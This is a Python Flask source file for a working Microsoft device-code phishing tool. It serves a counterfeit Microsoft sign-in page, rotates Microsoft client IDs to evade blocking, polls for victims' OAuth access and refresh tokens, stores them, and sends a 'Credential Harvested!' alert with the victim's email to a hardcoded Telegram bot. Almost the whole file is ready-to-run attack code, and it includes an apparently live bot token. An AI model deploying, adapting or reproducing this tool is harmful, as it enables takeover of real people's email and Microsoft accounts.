import os
import sys
import time
import uuid
import json
import sqlite3
import threading
import requests
from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from datetime import datetime, timezone

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft Device Code Flow Constants
TENANT_ID = "common"
# Using a mix of client IDs to rotate if one gets blocked. 
# Note: Microsoft actively blocks these. You may need to find new ones.
CLIENT_IDS = [
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office 365 Management
    "00b41c95-dab0-4487-9791-b9d2c32c80f2",  # Office 365 Shell
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
]

app = Flask(__name__)
DB_PATH = "sessions.db"

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY,
        device_code TEXT,
        user_code TEXT,
        verification_uri TEXT,
        client_id TEXT,
        status TEXT DEFAULT 'pending',
        tokens TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        completed_at TIMESTAMP
    )''')
    conn.commit()
    conn.close()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

# --- Telegram Notification ---
def send_telegram_notification(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"[ERROR] Telegram send failed: {e}")

# --- Microsoft API Interaction ---
def get_device_code(client_id):
    url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
    data = {
        "client_id": client_id,
        "scope": "openid profile offline_access User.Read Mail.Read"
    }
    try:
        resp = requests.post(url, data=data, timeout=10)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        print(f"[ERROR] Device code request failed for {client_id}: {e}")
        return None

def poll_for_token(device_code, client_id, sid):
    url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": device_code,
        "client_id": client_id
    }
    
    max_attempts = 60  # 5 minutes approx (5s * 60)
    for i in range(max_attempts):
        try:
            resp = requests.post(url, data=data, timeout=10)
            result = resp.json()
            
            if resp.status_code == 200:
                # Success!
                tokens = json.dumps(result)
                update_session_status(sid, "success", tokens)
                
                # Extract key info for notification
                id_token = result.get("id_token", "N/A")
                access_token = result.get("access_token", "N/A")
                refresh_token = result.get("refresh_token", "N/A")
                
                # Decode ID Token for email (basic JWT decode without verification for speed)
                email = "Unknown"
                if id_token != "N/A":
                    try:
                        parts = id_token.split('.')
                        if len(parts) == 3:
                            import base64
                            # Add padding if needed
                            payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
                            decoded_payload = json.loads(base64.urlsafe_b64decode(payload))
                            email = decoded_payload.get("preferred_username", decoded_payload.get("upn", "Unknown"))
                    except:
                        pass

                msg = f"<b>✅ Credential Harvested!</b>\n\n<b>Email:</b> <code>{email}</code>\n<b>Access Token:</b> <code>{access_token[:20]}...</code>\n<b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n<b>Session ID:</b> <code>{sid}</code>"
                send_telegram_notification(msg)
                return True
                
            elif result.get("error") == "authorization_pending":
                time.sleep(5)
                continue
            elif result.get("error") == "slow_down":
                time.sleep(10)
                continue
            else:
                # Other errors (invalid_grant, expired_token, etc.)
                print(f"[POLL ERROR] SID {sid}: {result}")
                update_session_status(sid, "failed", json.dumps(result))
                return False
                
        except Exception as e:
            print(f"[POLL EXCEPTIONPTION] SID {sid}: {e}")
            time.sleep(5)
            
    update_session_status(sid, "expired", "Polling timed out")
    return False

def update_session_status(sid, status, data=None):
    conn = get_db()
    try:
        if status == "success" or status == "failed" or status == "expired":
            conn.execute("UPDATE sessions SET status = ?, tokens = ?, completed_at = CURRENT_TIMESTAMP WHERE sid = ?", 
                         (status, data, sid))
        else:
            conn.execute("UPDATE sessions SET status = ? WHERE sid = ?", (status, sid))
        conn.commit()
    finally:
        conn.close()

# --- Background Watcher ---
active_watchers = {}

def start_watcher(sid, device_code, client_id):
    if sid in active_watchers:
        return # Already watching
    
    def watcher_thread():
        try:
            poll_for_token(device_code, client_id, sid)
        finally:
            if sid in active_watchers:
                del active_watchers[sid]
                
    t = threading.Thread(target=watcher_thread, daemon=True)
    t.start()
    active_watchers[sid] = t

# --- Routes ---

@app.route('/')
def index():
    # Generate a new session
    sid = str(uuid.uuid4())[:12]
    
    # Try client IDs until one works
    device_code_data = None
    used_client_id = None
    
    for cid in CLIENT_IDS:
        data = get_device_code(cid)
        if data and "device_code" in data:
            device_code_data = data
            used_client_id = cid
            break
            
    if not device_code_data:
        return "Error: Could not initialize login service. Please try again later.", 503
        
    # Save to DB
    conn = get_db()
    try:
        conn.execute("INSERT INTO sessions (sid, device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?, ?)",
                     (sid, device_code_data['device_code'], device_code_data['user_code'], 
                      device_code_data['verification_uri'], used_client_id))
        conn.commit()
    finally:
        conn.close()
        
    # Start background polling
    start_watcher(sid, device_code_data['device_code'], used_client_id)
    
    # Render the phishing page
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to your account</title>
        <style>
            body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .container {{ background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); text-align: center; }}
            .logo {{ margin-bottom: 20px; }}
            h1 {{ font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #1b1b1b; }}
            p {{ font-size: 15px; color: #1b1b1b; margin-bottom: 20px; }}
            .code-box {{ border: 1px solid #ccc; padding: 10px; font-size: 24px; letter-spacing: 2px; margin: 20px 0; background: #f9f9f9; font-weight: bold; }}
            .btn {{ background-color: #0067b8; color: white; border: none; padding: 8px 32px; font-size: 15px; cursor: pointer; width: 100%; margin-top: 10px; }}
            .btn:hover {{ background-color: #005da6; }}
            .footer {{ margin-top: 20px; font-size: 12px; color: #666; }}
        </style>
    </head>
    <body>
        <div class="container">
            <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft Logo" class="logo" style="height: 24px;">
            <h1>Sign in</h1>
            <p>To sign in, use the code shown below.</p>
            
            <div class="code-box" id="userCode">{device_code_data['user_code']}</div>
            
            <button class="btn" onclick="copyAndRedirect()">Copy Code & Sign In</button>
            
            <div class="footer">
                <p>Go to <a href="{device_code_data['verification_uri']}" target="_blank">{device_code_data['verification_uri']}</a> on another device.</p>
            </div>
        </div>
        <script>
            function copyAndRedirect() {{
                const code = document.getElementById('userCode').innerText;
                navigator.clipboard.writeText(code).then(() => {{
                    window.location.href = '{device_code_data['verification_uri']}';
                }}).catch(err => {{
                    console.error('Failed to copy: ', err);
                    window.location.href = '{device_code_data['verification_uri']}';
                }});
            }}
        </script>
    </body>
    </html>
    """
    return html

@app.route('/status')
def status():
    sid = request.args.get('sid')
    if not sid:
        return jsonify({"status": "error"}), 400
        
    conn = get_db()
    try:
        row = conn.execute("SELECT status FROM sessions WHERE sid = ?", (sid,)).fetchone()
        if row:
            return jsonify({"status": row['status']})
        else:
            return jsonify({"status": "not_found"}), 404
    finally:
        conn.close()

@app.route('/debug')
def debug():
    conn = get_db()
    try:
        rows = conn.execute("SELECT sid, status, created_at FROM sessions ORDER BY created_at DESC LIMIT 10").fetchall()
        return jsonify([dict(r) for r in rows])
    finally:
        conn.close()

if __name__ == '__main__':
    init_db()
    # Use port 10000 for Render
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
